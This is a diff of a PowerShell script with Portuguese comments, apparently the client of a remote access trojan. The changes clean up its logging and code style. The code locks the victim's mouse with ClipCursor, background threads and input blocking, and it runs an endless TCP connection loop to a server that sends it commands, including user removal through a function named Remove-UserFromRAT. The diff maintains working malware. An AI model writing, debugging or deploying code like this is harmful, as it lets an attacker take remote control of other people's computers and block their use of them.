@@ -496,7 +496,7 @@ function Unlock-Screen {
     }
 }
 
-# ===== TRAVAR MOUSE (CORRIGIDO - TODAS AS CHAVES BALANCEADAS) =====
+# ===== TRAVAR MOUSE (VERSÃO CORRIGIDA - SEM ERROS) =====
 $script:mouseLocked = $false
 $script:lockThread = $null
 $script:reinforceThread = $null
@@ -504,11 +504,13 @@ $script:clipCursorSuccess = $false
 
 function Lock-Mouse {
     try {
-        if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
+        if ($script:mouseLocked) { 
+            return "MOUSE_ALREADY_LOCKED" 
+        }
         
-        Write-DebugLog "=" * 60
+        Write-DebugLog ("=" * 60)
         Write-DebugLog "INICIANDO TRAVAMENTO DO MOUSE"
-        Write-DebugLog "=" * 60
+        Write-DebugLog ("=" * 60)
         
         $script:mouseLocked = $true
         
@@ -558,9 +560,9 @@ public class MouseLocker {
             Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
             [MouseLocker]::Lock()
             $script:clipCursorSuccess = $true
-            Write-DebugLog "✓ ClipCursor aplicado com sucesso"
+            Write-DebugLog "ClipCursor aplicado com sucesso"
         } catch {
-            Write-DebugLog "✗ Falha no ClipCursor: $_"
+            Write-DebugLog "Falha no ClipCursor: $_"
             $script:clipCursorSuccess = $false
         }
         
@@ -578,7 +580,7 @@ public class MouseLocker {
         })
         $script:lockThread.IsBackground = $true
         $script:lockThread.Start()
-        Write-DebugLog "✓ Thread de movimento iniciada"
+        Write-DebugLog "Thread de movimento iniciada"
         
         # CAMADA 3: Reforço do ClipCursor
         if ($script:clipCursorSuccess) {
@@ -595,7 +597,7 @@ public class MouseLocker {
             })
             $script:reinforceThread.IsBackground = $true
             $script:reinforceThread.Start()
-            Write-DebugLog "✓ Thread de reforço iniciada"
+            Write-DebugLog "Thread de reforço iniciada"
         }
         
         # CAMADA 4: Bloqueio de eventos
@@ -618,27 +620,28 @@ public class InputBlocker {
 '@
             Add-Type -TypeDefinition $blockInputCode -ErrorAction SilentlyContinue
             [InputBlocker]::Block()
-            Write-DebugLog "✓ Bloqueio de eventos aplicado"
+            Write-DebugLog "Bloqueio de eventos aplicado"
         } catch {
-            Write-DebugLog "✗ Falha no bloqueio de eventos: $_"
+            Write-DebugLog "Falha no bloqueio de eventos: $_"
         }
         
-        Write-DebugLog "=" * 60
-        Write-DebugLog "TRAVAMENTO DO MOUSE CONCLUÍDO"
-        Write-DebugLog "=" * 60
+        Write-DebugLog ("=" * 60)
+        Write-DebugLog "TRAVAMENTO DO MOUSE CONCLUIDO"
+        Write-DebugLog ("=" * 60)
         
         return "MOUSE_LOCKED"
+        
     } catch {
-        Write-DebugLog "❌ ERRO CRÍTICO em Lock-Mouse: $_"
+        Write-DebugLog "ERRO CRITICO em Lock-Mouse: $_"
         return "MOUSE_LOCK_ERROR"
     }
 }
 
 function Unlock-Mouse {
     try {
-        Write-DebugLog "=" * 60
-        Write-DebugLog "INICIANDO LIBERAÇÃO DO MOUSE"
-        Write-DebugLog "=" * 60
+        Write-DebugLog ("=" * 60)
+        Write-DebugLog "INICIANDO LIBERACAO DO MOUSE"
+        Write-DebugLog ("=" * 60)
         
         $script:mouseLocked = $false
         
@@ -646,29 +649,29 @@ function Unlock-Mouse {
         if ($script:clipCursorSuccess) {
             try {
                 [MouseLocker]::Unlock()
-                Write-DebugLog "✓ ClipCursor liberado"
+                Write-DebugLog "ClipCursor liberado"
             } catch {
-                Write-DebugLog "✗ Erro ao liberar ClipCursor: $_"
+                Write-DebugLog "Erro ao liberar ClipCursor: $_"
             }
         }
         
         # Libera bloqueio de eventos
         try {
             [InputBlocker]::Unblock()
-            Write-DebugLog "✓ Bloqueio de eventos liberado"
+            Write-DebugLog "Bloqueio de eventos liberado"
         } catch {
-            Write-DebugLog "✗ Erro ao liberar bloqueio de eventos: $_"
+            Write-DebugLog "Erro ao liberar bloqueio de eventos: $_"
         }
         
         # Para threads
         if ($script:lockThread -and $script:lockThread.IsAlive) {
             $script:lockThread.Abort()
-            Write-DebugLog "✓ Thread de movimento abortada"
+            Write-DebugLog "Thread de movimento abortada"
         }
         
         if ($script:reinforceThread -and $script:reinforceThread.IsAlive) {
             $script:reinforceThread.Abort()
-            Write-DebugLog "✓ Thread de reforço abortada"
+            Write-DebugLog "Thread de reforço abortada"
         }
         
         # Força liberação
@@ -676,18 +679,19 @@ function Unlock-Mouse {
             Add-Type -AssemblyName System.Windows.Forms
             [System.Windows.Forms.Cursor]::Clip = New-Object System.Drawing.Rectangle(0, 0, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
             [System.Windows.Forms.Cursor]::Show()
-            Write-DebugLog "✓ Cursor liberado via Cursor.Clip"
+            Write-DebugLog "Cursor liberado via Cursor.Clip"
         } catch {
-            Write-DebugLog "✗ Erro ao forçar liberação: $_"
+            Write-DebugLog "Erro ao forcar liberacao: $_"
         }
         
-        Write-DebugLog "=" * 60
-        Write-DebugLog "LIBERAÇÃO DO MOUSE CONCLUÍDA"
-        Write-DebugLog "=" * 60
+        Write-DebugLog ("=" * 60)
+        Write-DebugLog "LIBERACAO DO MOUSE CONCLUIDA"
+        Write-DebugLog ("=" * 60)
         
         return "MOUSE_UNLOCKED"
+        
     } catch {
-        Write-DebugLog "❌ ERRO CRÍTICO em Unlock-Mouse: $_"
+        Write-DebugLog "ERRO CRITICO em Unlock-Mouse: $_"
         return "MOUSE_UNLOCK_ERROR"
     }
 }
@@ -778,7 +782,7 @@ function Power-Control {
     }
 }
 
-# ===== CONEXAO PRINCIPAL =====
+# ===== CONEXAO PRINCIPAL (CORRIGIDA) =====
 while ($true) {
     try {
         $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
@@ -864,12 +868,12 @@ while ($true) {
             } elseif ($cmd -match "^remove_user (.+)$") {
                 $writer.WriteLine((Remove-UserFromRAT $matches[1]))
             } else {
-                Write-DebugLog "Comando não reconhecido: $cmd"
+                Write-DebugLog "Comando nao reconhecido: $cmd"
                 $writer.WriteLine("Comando nao reconhecido")
             }
         }
     } catch {
-        Write-DebugLog "Erro na conexão: $_"
+        Write-DebugLog "Erro na conexao: $_"
         Start-Sleep -Seconds 10
     } finally {
         if ($client) { $client.Close() }
